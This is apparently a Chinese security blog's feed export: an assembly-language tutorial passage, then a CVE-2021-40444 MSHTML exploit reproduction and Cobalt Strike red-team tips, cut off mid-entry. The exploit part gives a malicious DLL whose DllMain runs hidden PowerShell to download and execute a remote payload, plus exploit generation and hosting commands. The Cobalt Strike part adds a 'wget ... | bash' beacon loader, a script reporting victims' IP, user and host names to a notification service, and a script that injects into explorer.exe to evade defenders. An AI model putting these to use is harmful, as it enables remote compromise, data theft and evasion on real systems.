alt="image-20211008141056040"></p><h2 id="除法运算符"><a href="#除法运算符" class="headerlink" title="除法运算符"></a>除法运算符</h2><p>使用div</p><p>注：被除数是隐含的， 且总是指定为累加器AX 的内容</p><p>结果 商保存在AX中，余数保存在DX中</p><pre class="line-numbers language-none"><code class="language-none">assume cs:codecode segment   ;代码段matrix procmov ax, 15mov bx, 6div bx ;做除法mov ax,4C00Hint 21Hmatrix endpstart:call matrixcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148943.png" alt="image-20211008141446326"></p><h2 id="汇编中的逻辑指令"><a href="#汇编中的逻辑指令" class="headerlink" title="汇编中的逻辑指令"></a>汇编中的逻辑指令</h2><pre class="line-numbers language-none"><code class="language-none">xor 异或and 与or  或not 取反<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>与C语言的 运算一样</p><pre class="line-numbers language-none"><code class="language-none">assume cs:codecode segment   ;代码段matrix procmov ax, 15mov bx, 6xor ax, bx ;异或and ax, bx ;与or ax, bx  ;或not ax     ;取反mov ax,4C00Hint 21Hmatrix endpstart:call matrixcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="封装函数"><a href="#封装函数" class="headerlink" title="封装函数"></a>封装函数</h2><p>注：16位汇编接收输入时，得到的都是ASCII码</p><pre class="line-numbers language-none"><code class="language-none">assume cs:code, ds:datamlength = 6 ;一个全局变量的常量data segment buffer db mlengthdb ? ;不定长db mlength dup(0), '$'   ;dup是定义数组data endscode segment   ;代码段 ,主函数InitDataSegment proc  ;封装初始化数据段的函数mov ax, datamov ds, axretInitDataSegment endpMExit proc   ;封装退出函数mov ax,4C00Hint 21HMExit endpMPrint proc ;封装打印函数push axmov ah,9Hint 21Hpop axretMPrint endpMScanf proc ;封装输入函数push axpush bxpush cxpush dxmov ah, 0AH ;0AH接收缓冲区输入int 21Hpop dxpop cxpop bxpop axMScanf endpMEnter proc ;封装换行函数push axpush dxmov dl, 0DHmov ah, 02Hint 21Hmov dl, 0AHmov ah, 02Hint 21Hpop dxpop axMEnter endpmatrix proccall InitDataSegment ;调用初始化数据段的函数matrix endpstart:call matrixcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="加法运算器"><a href="#加法运算器" class="headerlink" title="加法运算器"></a>加法运算器</h2><pre class="line-numbers language-none"><code class="language-none">assume cs:code, ds:datamlength = 6 ;一个全局变量的常量data segment bufferNumber1 db mlengthdb ? ;不定长db mlength dup(0), '$'   ;dup是定义数组bufferNumber2 db mlengthdb ? ;不定长db mlength dup(0), '$'   ;dup是定义数组num1 dw ?num2 dw ?buffer1 db 0DH, 0AH , 'input number1: $'buffer2 db 0DH, 0AH , 'input number2: $'buffer3 db 0DH, 0AH , 'input (+ - * /): $'add_ret dw 6 dup(0), '$' data endscode segment   ;代码段 ,主函数InitDataSegment proc  ;封装初始化数据段的函数mov ax, datamov ds, axretInitDataSegment endpMExit proc   ;封装退出函数mov ax,4C00Hint 21HMExit endpMPrint proc ;封装打印函数push axmov ah,9Hint 21Hpop axretMPrint endpMScanf proc ;封装输入函数push axpush bxpush cxpush dxmov ah, 0AH ;0AH接收缓冲区输入int 21Hpop dxpop cxpop bxpop axMScanf endpMEnter proc ;封装换行函数push axpush dxmov dl, 0DHmov ah, 02Hint 21Hmov dl, 0AHmov ah, 02Hint 21Hpop dxpop axMEnter endpmatrix proccall InitDataSegment ;调用初始化数据段的函数;存储第一个数mov dx, offset buffer1call MPrintmov dx, offset bufferNumber1call MScanfcall MEntermov bx, offset bufferNumber1 + 1 ;sacnf 放进来的数是在后一位call AsciiToNumbermov num1, ax;存储第二个数mov dx, offset buffer2call MPrintmov dx, offset bufferNumber2call MScanfcall MEntermov bx, offset bufferNumber2 + 1 ;sacnf 放进来的数是在后一位call AsciiToNumbermov num2, ax;接收运算符mov dx, offset buffer3call MPrintmov ah, 07Hint 21Hcall MEnter;进行指令对比cmp al, 2BH ;2BH是加法的je addflagjmp exitcodeaddflag:mov ax, [num1]mov bx, [num2]mov bx, offset add_retcall NumberToAsciimov dx, offset add_retcall MPrintcall MEnterexitcode:call MEntercall MEntermatrix endpstart:call matrixcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="dup解释"><a href="#dup解释" class="headerlink" title="dup解释"></a>dup解释</h2><pre class="line-numbers language-none"><code class="language-none">TAB1 DB 10H DUP(?)TAB1      变量名 DB        变量类型 10H       长度  DUP(?)    填充物<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148944.png" alt="image-20211008175923817"></p><h2 id="C转汇编"><a href="#C转汇编" class="headerlink" title="C转汇编"></a>C转汇编</h2><p>用Debug模式</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148945.png" alt="image-20211008180415789"></p><p>把显示符号名 <strong>去掉</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148946.png" alt="image-20211008180502607"></p><p>改优化</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148947.png" alt="image-20211008180643327"></p><h2 id="32位寄存器"><a href="#32位寄存器" class="headerlink" title="32位寄存器"></a>32位寄存器</h2><pre class="line-numbers language-none"><code class="language-none">8个通用寄存器EAXEBXECXEDXESIEDIESPEBPEIPEFLAGS6个段寄存器CSDSESSSFSGS段寄存器工作流程:段选择子-&gt;GDT-&gt;段描述符R3 用户层R0 系统内核针对FS他在R3层:TEB (线程环境块)他在R0层:驱动 KPCR(CPU状态块)针对CS它是64位系统下的FS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四种函数调用约定"><a href="#四种函数调用约定" class="headerlink" title="四种函数调用约定"></a>四种函数调用约定</h2><pre class="line-numbers language-none"><code class="language-none">1.cdedll  32位下C语言函数调用约定2.stdcall WindowsAPI的调用约定3.fastcall4.thiscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="32位项目基本架构"><a href="#32位项目基本架构" class="headerlink" title="32位项目基本架构"></a>32位项目基本架构</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148948.png" alt="image-20211013153735594"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148949.png" alt="image-20211013153825405"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148950.png" alt="image-20211013154056539"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148951.png" alt="image-20211013154138478"></p><p>下载添加 关闭重新启动一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148952.png" alt="image-20211013155030984"></p><p>添加函数入口店</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148953.png" alt="image-20211013154223564"></p><pre class="line-numbers language-none"><code class="language-none">.386 ;指定指令集;.model 内存的使用方式:数据段和代码段 函数的调用约定.model flat,stdcalloption casemap:none ;指定一下.data;dd dword 新的数据类型:dword.codemain procmain endpend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="库文件"><a href="#库文件" class="headerlink" title="库文件"></a>库文件</h2><pre class="line-numbers language-none"><code class="language-none">dll:动态链接库lib:静态链接库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="库函数-和-Windows-API-的使用"><a href="#库函数-和-Windows-API-的使用" class="headerlink" title="库函数 和 Windows API 的使用"></a>库函数 和 Windows API 的使用</h2><pre class="line-numbers language-none"><code class="language-none">;Windows API(记得包含lib/dll)MessageBoxA PROTO hWnd:DWORD, lpText:BYTE, lpCation:BYTE,uType:DWORDExitProcess PROTO uType:DWORD ;退出的库函数;库函数extern printf:procextern putchar:procextern scanf:proc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282148954.png" alt="image-20211013160959800"></p><h2 id="32位汇编循环打印0-100"><a href="#32位汇编循环打印0-100" class="headerlink" title="32位汇编循环打印0-100"></a>32位汇编循环打印0-100</h2>]]></content>
      
      
      <categories>
          
          <category> C &amp; 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C &amp; 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-40444</title>
      <link href="/2021/10/28/cve-2021-40444-fu-xian/"/>
      <url>/2021/10/28/cve-2021-40444-fu-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2021-40444复现"><a href="#CVE-2021-40444复现" class="headerlink" title="CVE-2021-40444复现"></a>CVE-2021-40444复现</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>2021年9月8日，微软发布安全通告披露了Microsoft MSHTML远程代码执行漏洞，攻击者可通过制作恶意的ActiveX控件供托管浏览器呈现引擎的 Microsoft Office文档使用，成功诱导用户打开恶意文档后，可在目标系统上以该用户权限执行任意代码，微软在通告中指出已检测到该漏洞被在野利用，请相关用户采取措施进行防护。</p><p>MSHTML(又称为Trident)是微软旗下的Internet Explorer浏览器引擎，也用于Office应用程序，以在Word、Excel或PowerPoint文档中呈现Web托管的内容，AcitveX控件是微软COM架构下的产物，在Windows的Office套件、IE浏览器中有广泛的应用，利用ActiveX控件即可与MSHTML组件进行交互。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Windows Server, version 20H2 (Server Core Installation)<br>Windows Server, version 2004 (Server Core installation)<br>Windows Server 2022 (Server Core installation)<br>Windows Server 2022<br>Windows Server 2019 (Server Core installation)<br>Windows Server 2019<br>Windows Server 2016 (Server Core installation)<br>Windows Server 2016<br>Windows Server 2012 R2 (Server Core installation)<br>Windows Server 2012 R2<br>Windows Server 2012 (Server Core installation)<br>Windows Server 2012<br>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)<br>Windows Server 2008 for x64-based Systems Service Pack 2<br>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)<br>Windows Server 2008 for 32-bit Systems Service Pack 2<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>Windows RT 8.1<br>Windows 8.1 for x64-based systems<br>Windows 8.1 for 32-bit systems<br>Windows 7 for x64-based Systems Service Pack 1<br>Windows 7 for 32-bit Systems Service Pack 1<br>Windows 10 for x64-based Systems<br>Windows 10 for 32-bit Systems<br>Windows 10 Version 21H1 for x64-based Systems<br>Windows 10 Version 21H1 for ARM64-based Systems<br>Windows 10 Version 21H1 for 32-bit Systems<br>Windows 10 Version 20H2 for x64-based Systems<br>Windows 10 Version 20H2 for ARM64-based Systems<br>Windows 10 Version 20H2 for 32-bit Systems<br>Windows 10 Version 2004 for x64-based Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1809 for x64-based Systems<br>Windows 10 Version 1809 for ARM64-based Systems<br>Windows 10 Version 1809 for 32-bit Systems<br>Windows 10 Version 1607 for x64-based Systems<br>Windows 10 Version 1607 for 32-bit Systems</p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>未经身份验证的攻击者可以利用该漏洞在目标系统上执行代码。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现环境：win10（office10），kali2021</p><p>github地址：<a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916101633325.png" alt="image-20210916101633325"></p><p>需要先安装lcab( lcab 包的官方下载地址已经无法下载，所以代替为 Debian 的官方下载地址）</p><pre class="line-numbers language-none"><code class="language-none">wget http://ftp.debian.org/debian/pool/main/l/lcab/lcab_1.0b12.orig.tar.gztar zxvf lcab_1.0b12.orig.tar.gzcd lcab-1.0b12./configuremakesudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916101452067.png" alt="image-20210916101452067"></p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916101548259.png" alt="image-20210916101548259"></p><p>然后执行命令</p><pre class="line-numbers language-none"><code class="language-none">python3 exploit.py generate test/calc.dll http://192.168.190.129:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916101732983.png" alt="image-20210916101732983"></p><p>可以看见在out目录下生成了document.docx文件;</p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916101828485.png" alt="image-20210916101828485"></p><p>开启http服务</p><pre class="line-numbers language-none"><code class="language-none">python exploit.py host 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916101951396.png" alt="image-20210916101951396"></p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916102050987.png" alt="image-20210916102050987"></p><p>打开word.html文件可以看见，url是向外请求的cab文件链接</p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916102326389.png" alt="image-20210916102326389"></p><p>接着把document.docx拉到受害机子双击打开(切记：这里受害机子一定要关闭denfender，同时ie浏览器也一定要启动运行Activex控件和插件！！！)</p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210915103249889.png" alt="image-20210915103249889"></p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210915102528910.png"></p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210913124555962.png" alt="image-20210913124555962"></p><p>成功弹出计算器</p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916102734479.png"></p><p>把document.docx文件解压，进到/word/rels/document.xml文件中可以看见，发现是通过<code>MSHTML</code>来进行远程代码执行。</p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916103106420.png" alt="image-20210916103106420"></p><h3 id="cs上线"><a href="#cs上线" class="headerlink" title="cs上线"></a>cs上线</h3><p>cs生成ps payload;</p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916110244240.png" alt="image-20210916110244240"></p><p>写入1.c：</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;windows.h&gt;void exec(void) {system("powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://你的ip:你的端口/a'))\"");return;}BOOL WINAPI DllMain(   HINSTANCE hinstDLL,   DWORD fdwReason,   LPVOID lpReserved ){   switch( fdwReason )  {       case DLL_PROCESS_ATTACH:          exec();          break;       case DLL_THREAD_ATTACH:           break;       case DLL_THREAD_DETACH:           break;       case DLL_PROCESS_DETACH:           break;  }   return TRUE;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916111436475.png"></p><p>生成dll</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install gcc-mingw-w64i686-w64-mingw32-gcc -shared 1.c -o 1.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916115843274.png" alt="image-20210916115843274"></p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916122446247.png" alt="image-20210916122446247"></p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916122541682.png" alt="image-20210916122541682"></p><p>受害机子成功上线~</p><p><img src="https://gitee.com/zgd1999128/img/raw/master/img/image-20210916122619914.png" alt="image-20210916122619914"></p><h3 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h3><p>1.在 Internet Explorer 中禁用所有 ActiveX 控件的安装。</p><p>2.将如下代码复制到文本文件中并以 .reg 文件扩展名保存：</p><pre class="line-numbers language-none"><code class="language-none">Windows Registry EditorVersion 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet  Settings\Zones\0]"1001"=dword:00000003"1004"=dword:00000003[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet  Settings\Zones\1]"1001"=dword:00000003"1004"=dword:00000003[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet  Settings\Zones\2]"1001"=dword:00000003"1004"=dword:00000003[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet  Settings\Zones\3]"1001"=dword:00000003"1004"=dword:00000003<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>b、双击.reg 文件，将其应用到策略配置单元；</p><p>c、重新启动系统以确保应用新配置。</p>]]></content>
      
      
      <categories>
          
          <category> 红队技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2021-40444 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobalStrike Tips小结</title>
      <link href="/2021/10/28/cobalstrike-tips-xiao-jie/"/>
      <url>/2021/10/28/cobalstrike-tips-xiao-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="CobalStrike-Tips"><a href="#CobalStrike-Tips" class="headerlink" title="CobalStrike Tips"></a>CobalStrike Tips</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人称为CS。</p><p>这款神器许多大佬们都已经玩的很6，是渗透测试中不可缺少的利器！</p><p>CobaltStrike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe 木马生成，windows dll  木马生成，java 木马生成，office 宏病毒生成，木马捆绑。钓鱼攻击包括：站点克隆，目标信息获取，java  执行，浏览器自动攻击等等强大的功能</p><p>同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱</p><h2 id="上线Linux主机"><a href="#上线Linux主机" class="headerlink" title="上线Linux主机"></a>上线Linux主机</h2><h3 id="下载CrossC2"><a href="#下载CrossC2" class="headerlink" title="下载CrossC2"></a>下载CrossC2</h3><p><a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a></p><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>CrossC2是CobalStrike的⼀个脚本，CobalStrike直接生成的beacon只适⽤于windows，通过CrossC2可以生成Linux跨平台的beacon</p><p>CrossC2支持无文件落地从内存中加载执行 <code>动态库</code>、 <code>可执行文件</code></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>现已支持4.1版本，笔者就用4.1做演示吧</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="1-配置cna文件"><a href="#1-配置cna文件" class="headerlink" title="1.配置cna文件"></a>1.配置cna文件</h4><p>第一个是genCrossC2的绝对路径，genCrossC2就是上一步src目录中对应三种系统的载荷；</p><p>第二个变量就是你要选择那种载荷，这里我们尝试上线linux主机，所以选genCrossC2.Linux</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505382.png" alt="image-20211019140244834"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505384.png" alt="image-20211019140337766"></p><h4 id="2-拷贝-cobaltstrike-beacon-keys文件"><a href="#2-拷贝-cobaltstrike-beacon-keys文件" class="headerlink" title="2.拷贝.cobaltstrike.beacon_keys文件"></a>2.拷贝<code>.cobaltstrike.beacon_keys</code>文件</h4><p>从服务端拷贝<code>.cobaltstrike.beacon_keys</code>文件到客户端启动目录下</p><p>注：这个文件是个隐藏文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505385.png" alt="image-20211019140711828"></p><h4 id="3-Linux客户端启动"><a href="#3-Linux客户端启动" class="headerlink" title="3.Linux客户端启动"></a>3.Linux客户端启动</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505386.png" alt="image-20211019140951319"></p><h4 id="4-上传脚本"><a href="#4-上传脚本" class="headerlink" title="4.上传脚本"></a>4.上传脚本</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505387.png" alt="image-20211019141112394"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505388.png" alt="image-20211019141202863"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505389.png" alt="image-20211019141221501"></p><h4 id="5-创建监听"><a href="#5-创建监听" class="headerlink" title="5.创建监听"></a>5.创建监听</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505390.png" alt="image-20211019151602294"></p><p>注：<strong>Cross C2目前只支持HTTPS Beacon，所以在Listenrs中选择HTTPS进行监听</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505391.png" alt="image-20211021141446135"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505392.png" alt="image-20211021141533216"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505393.png" alt="image-20211021141621463"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505394.png" alt="image-20211019150821044"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505395.png" alt="image-20211021141652825"></p><h4 id="6-上线linux主机"><a href="#6-上线linux主机" class="headerlink" title="6.上线linux主机"></a>6.上线linux主机</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505396.png" alt="image-20211019151011227"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505397.png" alt="image-20211021141807601"></p><pre class="line-numbers language-none"><code class="language-none">wget -U O -O - http://192.168.175.134:55413/a | bash -s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-成功上线"><a href="#7-成功上线" class="headerlink" title="7.成功上线"></a>7.成功上线</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505398.png" alt="image-20211021141853544"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505399.png" alt="image-20211021142118264"></p><h2 id="Windows-Executable-S"><a href="#Windows-Executable-S" class="headerlink" title="Windows Executable(S)"></a>Windows Executable(S)</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505400.png" alt="image-20211019201528138"></p><p>Windows Executable(S)用于生成一个exe可执行文件，其中包含Beacon的完整payload，不需</p><p>要阶段性的请求.因此生成的体积比较大. 打内网做横向的时候, 生成Beacon 优先考虑 Windows Executable(S)</p><h2 id="服务端上线插件"><a href="#服务端上线插件" class="headerlink" title="服务端上线插件"></a>服务端上线插件</h2><h3 id="场景"><a href="#场景" class="headerlink" title="场景-"></a>场景-</h3><p>当我们钓鱼的时候，我们把cna脚本添加到本地客户端后，如果有机器上线了，这个提醒的请求是从客户端发出的</p><p>那么问题来了，如果我要接收通知，是不是就得一直开着客户端连着 teamserver</p><p>这样就非常不方便了，而且如果网络有波动，断开了到 teamserver 的连接，就收不到通知了</p><p>其实在服务器端有个<code>agscript</code>文件，他就是用来在服务器端运行 cna 文件的，这样就不用一直连着服务器端</p><p>给师傅们把插件贴出来吧</p><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><pre class="line-numbers language-none"><code class="language-none"># 循环获取所有 beaconon beacon_initial {sub http_get {local('$output');$url = [new java.net.URL: $1];$stream = [$url openStream];$handle = [SleepUtils getIOHandle: $stream, $null];@content = readAll($handle);foreach $line (@content) {$output .= $line . "\r\n";}println($output);}#获取 ip、计算机名、登录账号$internalIP = replace(beacon_info($1, "internal"), " ", "_");$userName = replace(beacon_info($1, "user"), " ", "_");$computerName = replace(beacon_info($1, "computer"), " ", "_");#get 一下 Server 酱的链接$url = 'https://sctapi.ftqq.com/XXXXXXXXXXXX(key).send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&amp;desp=%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0AIP:'.$internalIP.'%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:'.$userName.'%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:'.$computerName;http_get($url);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><pre class="line-numbers language-none"><code class="language-none">./agscript [host] [port] [user] [pass] &lt;/path/to/file.cna&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">[host]   #服务器的ip 地址[port]   #cs 的端口号,启动 cs 时有显示[user]   #用户名,用来运行这个脚本的用户名[pass]   #启动cs时设置的密码[path]   #cna文件的路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h2><h3 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h3><p>受控机器成功上线，但是我们的马可能会被防守人员注意到，从而失去得分的机会</p><h3 id="插件-1"><a href="#插件-1" class="headerlink" title="插件"></a>插件</h3><pre class="line-numbers language-none"><code class="language-none">on beacon_initial{ sub callback {  $regex = '(.*\n)+explorer.exe\t\d+\t(\d+)(.*\n)+';  $listener = "test";  if ($2  ismatch $regex)  {   $pid = matched()[1];   $inject_pid = $pid;   if (-is64 $1)   {    $arch = "x64";   }   else   {    $arch = "x86";   }   binject($1, $pid, $listener, $arch);  } } if($inject_pid != beacon_info($1,"pid")) {  bps($1, &amp;callback); }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注：这里注意监听器的名字-&gt;test，师傅们根据自己的需求改一下</strong></p><h2 id="CobaltStrike反弹shell到MSF"><a href="#CobaltStrike反弹shell到MSF" class="headerlink" title="CobaltStrike反弹shell到MSF"></a>CobaltStrike反弹shell到MSF</h2><h3 id="1-MSF配置监听"><a href="#1-MSF配置监听" class="headerlink" title="1.MSF配置监听"></a>1.MSF配置监听</h3><pre class="line-numbers language-none"><code class="language-none">msf6 &gt; use 